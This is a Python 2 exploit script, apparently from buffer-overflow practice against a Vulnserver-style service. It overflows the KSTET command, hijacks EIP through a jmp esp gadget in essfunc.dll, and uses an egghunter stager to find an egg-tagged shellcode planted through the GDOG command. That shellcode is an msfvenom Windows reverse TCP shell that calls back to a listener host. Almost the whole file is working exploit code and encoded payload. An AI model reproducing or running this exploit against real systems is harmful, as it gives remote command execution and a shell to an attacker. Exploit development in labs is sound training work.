#!/usr/bin/env python2.7

import socket

#EIP overwrite at 70 bytes

#EAX ==> KSTET AAAAAAAAAAAAAAAAAAAA....
#We can overwrite EIP with the following assembly
#EIP -- > jmp esp
#\xaf\x11\x50\x62 in essfunc.dll
#Next, at stack:
#add al, 0x6 ("KSTET " is 6 characters)
#jmp eax
#Assembly --> \x04\x06\xff\xe0

#add a NOP before A's to settle in the larger buffer
NOP = "\x90" * 8

#There is an issue as to how to put the larger payload to execute shell?
#We send a non vulnerable command such as GDOG with a buffer.
#This buffer can hold the original shellcode
#After this we can send the crash buffer to exploit the vulnerability

# !mona egg -t b33f : szie 32 bytes
secondStager = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#buffer = [70 Larger A's] + JMP ESP + [JMP EAX+6] + more Junk
#first Run GDOG seen at 0x00B8FBA8 and EAX=0x00B8F9C2
#second Run GDOG seen at 0x003E5A98 and EAX=0x00B8F9C2
#seems GDOG varies in memory
#Hence GDOG has to be an egg and in secondStager we need egghunter


buffer = NOP + secondStager + "A" * ( 70 - (len(secondStager) + len(NOP)) ) + "\xaf\x11\x50\x62" + "\x04\x06\xff\xe0" + "C" * (100-78)

#shellcode space with added egg
#badchar analysis reveals \x00 is badchar
#badchar = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#egg :msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.131 lport=443 -b "\x00" -f python

buf =  ""
buf += "\xd9\xe9\xbd\x67\xa2\xd9\x09\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\x0f\xb1\x3b"
buf += "\xfc\x33\x5d\x39\xff\xcb\x9e\x5e\x89\x2e\xaf\x5e\xed"
buf += "\x3b\x80\x6e\x65\x69\x2d\x04\x2b\x99\xa6\x68\xe4\xae"
buf += "\x0f\xc6\xd2\x81\x90\x7b\x26\x80\x12\x86\x7b\x62\x2a"
buf += "\x49\x8e\x63\x6b\xb4\x63\x31\x24\xb2\xd6\xa5\x41\x8e"
buf += "\xea\x4e\x19\x1e\x6b\xb3\xea\x21\x5a\x62\x60\x78\x7c"
buf += "\x85\xa5\xf0\x35\x9d\xaa\x3d\x8f\x16\x18\xc9\x0e\xfe"
buf += "\x50\x32\xbc\x3f\x5d\xc1\xbc\x78\x5a\x3a\xcb\x70\x98"
buf += "\xc7\xcc\x47\xe2\x13\x58\x53\x44\xd7\xfa\xbf\x74\x34"
buf += "\x9c\x34\x7a\xf1\xea\x12\x9f\x04\x3e\x29\x9b\x8d\xc1"
buf += "\xfd\x2d\xd5\xe5\xd9\x76\x8d\x84\x78\xd3\x60\xb8\x9a"
buf += "\xbc\xdd\x1c\xd1\x51\x09\x2d\xb8\x3d\xfe\x1c\x42\xbe"
buf += "\x68\x16\x31\x8c\x37\x8c\xdd\xbc\xb0\x0a\x1a\xc2\xea"
buf += "\xeb\xb4\x3d\x15\x0c\x9d\xf9\x41\x5c\xb5\x28\xea\x37"
buf += "\x45\xd4\x3f\x97\x15\x7a\x90\x58\xc5\x3a\x40\x31\x0f"
buf += "\xb5\xbf\x21\x30\x1f\xa8\xc8\xcb\xc8\x17\xa4\xeb\x8b"
buf += "\xf0\xb7\x0b\x8d\xbb\x31\xed\xe7\xab\x17\xa6\x9f\x52"
buf += "\x32\x3c\x01\x9a\xe8\x39\x01\x10\x1f\xbe\xcc\xd1\x6a"
buf += "\xac\xb9\x11\x21\x8e\x6c\x2d\x9f\xa6\xf3\xbc\x44\x36"
buf += "\x7d\xdd\xd2\x61\x2a\x13\x2b\xe7\xc6\x0a\x85\x15\x1b"
buf += "\xca\xee\x9d\xc0\x2f\xf0\x1c\x84\x14\xd6\x0e\x50\x94"
buf += "\x52\x7a\x0c\xc3\x0c\xd4\xea\xbd\xfe\x8e\xa4\x12\xa9"
buf += "\x46\x30\x59\x6a\x10\x3d\xb4\x1c\xfc\x8c\x61\x59\x03"
buf += "\x20\xe6\x6d\x7c\x5c\x96\x92\x57\xe4\xa6\xd8\xf5\x4d"
buf += "\x2f\x85\x6c\xcc\x32\x36\x5b\x13\x4b\xb5\x69\xec\xa8"
buf += "\xa5\x18\xe9\xf5\x61\xf1\x83\x66\x04\xf5\x30\x86\x0d"

shellcode = "b33fb33f" + buf

#formulating initial egg tagged shellcode to memory of process
initial = "GDOG " + shellcode

#formulating the egg hunter 
cmd = "KSTET " + buffer

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.128",9999))
#recieve banner from server
s.recv(1024)
#sending the egg tagged shellcode
s.send(initial)
s.recv(1024)
#sending the egg hunter
s.send(cmd)
print "[+]Done!"
s.close()
